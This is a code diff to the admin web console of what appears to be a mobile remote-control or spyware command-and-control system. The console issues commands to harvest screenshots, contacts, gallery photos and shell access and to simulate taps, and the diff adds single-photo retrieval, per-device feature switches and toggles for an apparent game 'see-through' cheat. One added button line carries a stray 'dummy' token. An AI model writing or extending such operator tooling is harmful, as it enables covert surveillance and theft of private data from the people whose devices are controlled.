@@ -149,6 +149,8 @@ input:-webkit-autofill{box-shadow:0 0 0 1000px #fff inset!important;-webkit-box-
         <button style="background:#7c3aed;color:#fff" onclick="c2CmdScreenshot()">截图</button>
         <button style="background:#0ea5e9;color:#fff" onclick="c2CmdGetContacts()">获取联系人</button>
         <button style="background:#7e22ce;color:#fff" onclick="c2CmdGetGallery()">获取相册</button>        <button style="background:#059669;color:#fff" onclick="showShellPanel()">Shell 命令</button>
+	        <button style="background:#ef4444;color:#fff" onclick="c2CmdToushi(true)">🔮 透视开</button>dummy
+	        <button style="background:#6b7280;color:#fff" onclick="c2CmdToushi(false)">🔮 透视关</button>
         <button style="background:#d97706;color:#fff" onclick="showTapPanel()">模拟点击</button>
         <button style="background:#be185d;color:#fff" onclick="showSwipePanel()">模拟滑动</button>
         <button style="background:#6b7280;color:#fff" onclick="c2ClearCommands()">清除命令队列</button>
@@ -561,6 +563,7 @@ function openC2Device(id, name){
   document.getElementById('c2DetailTitle').textContent = '设备控制 — ' + name;
   document.getElementById('c2DetailPanel').classList.remove('hide');
   loadC2Uploads(id);
+  renderC2Switches(id);
 }
 function showShellPanel(){ togglePanel('shellPanel'); }
 function showTapPanel(){ togglePanel('tapPanel'); }
@@ -596,7 +599,7 @@ async function loadC2Uploads(id){
   el.innerHTML = '<div style="color:#6b7280;font-size:12px;padding:4px 0 8px">共 '+list.length+' 条</div>' +
     list.map((u,i)=>{
       // 类型分类
-      const isScreenshot = u.type==='screenshot' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
+      const isScreenshot = u.type==='screenshot' || u.type==='get_photo' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
       const isGallery = u.type==='get_gallery';
       const isContacts = u.type==='get_contacts';
       const isText = u.filename.endsWith('.txt');
@@ -619,7 +622,7 @@ async function loadC2Uploads(id){
     }).join('');
   // 异步加载各文件内容（带 Bearer token）
   list.forEach(async (u,i)=>{
-    const isScreenshot = u.type==='screenshot' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
+    const isScreenshot = u.type==='screenshot' || u.type==='get_photo' || u.filename.endsWith('.png') || u.filename.endsWith('.jpg');
     const isGallery = u.type==='get_gallery';
     const isContacts = u.type==='get_contacts';
     const isText = u.filename.endsWith('.txt');
@@ -687,6 +690,33 @@ async function c2CmdGetGallery(){
   const limit = Math.min(500, Math.max(1, parseInt(cnt)||100));
   const r = await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'get_gallery',payload:{limit}})});
   r.ok ? toast(`相册命令已下发（limit=${limit}），等待心跳后刷新`) : alert(r.message||'失败');
+}
+async function renderC2Switches(deviceId){
+  try {
+    const data = await api('/admin/api/devices/'+deviceId);
+    const dev = data.device || {};
+    const cfg = dev.effective_config || {};
+    const sw = cfg.switches || [];
+    const container = document.getElementById('c2SwitchButtons');
+    if(!container) return;
+    if(!sw.length){ container.style.display='none'; return; }
+    container.style.display='inline-flex';
+    container.innerHTML = sw.map(s => {
+      const state = (dev.config_override&&dev.config_override['sw_'+s.key]!==undefined) ? dev.config_override['sw_'+s.key] : (s.default_on||false);
+      const cls = state ? '#ef4444' : '#6b7280';
+      const lbl = (state?'◉ ':'○ ')+esc(s.name)+(state?' 开':' 关');
+      return '<button style="background:'+cls+';color:#fff;border:0;border-radius:4px;padding:3px 10px;font-size:12px;cursor:pointer;white-space:nowrap" onclick="c2CmdSwitchToggle('+deviceId+',''+esc(s.key)+'','+(!state)+')">'+lbl+'</button>';
+    }).join('');
+  } catch(e){}
+}
+async function c2CmdSwitchToggle(deviceId, key, on){
+  const r = await api('/admin/api/devices/'+deviceId+'/command',{method:'POST',body:JSON.stringify({type:'switch_toggle',payload:{key, on}})});
+  r.ok ? toast('开关['+key+']命令已下发') : alert(r.message||'失败');
+}
+async function c2CmdGetPhoto(id){
+  if(!c2ActiveDeviceId) return;
+  const r = await api(`/admin/api/devices/${c2ActiveDeviceId}/command`,{method:'POST',body:JSON.stringify({type:'get_photo',payload:{id:String(id)}})});
+  r.ok ? toast('获取图片命令已下发，等待心跳后刷新') : alert(r.message||'失败');
 }
 
 // ---- 分组 ----
@@ -1028,7 +1058,7 @@ function renderMonitorUploads() {
   document.getElementById('monitorUploads').innerHTML = `<table><thead><tr><th>设备</th><th>类型</th><th>文件名</th><th>大小</th><th>时间</th><th>操作</th></tr></thead><tbody>` +
     uploads.map(u => {
       const fn = esc(u.filename);
-      const isImg = /\.(png|jpe?g|gif|webp)$/i.test(u.filename);
+      const isImg = u.type==='get_photo' || /\.(png|jpe?g|gif|webp)$/i.test(u.filename);
       const preview = isImg
         ? `<button class="small copy" onclick="viewMonitorImage('/admin/api/uploads/${fn}')">预览</button>`
         : `<button class="small copy" onclick="viewMonitorText('/admin/api/uploads/${fn}','${esc(u.type||'')}')">查看</button>`;
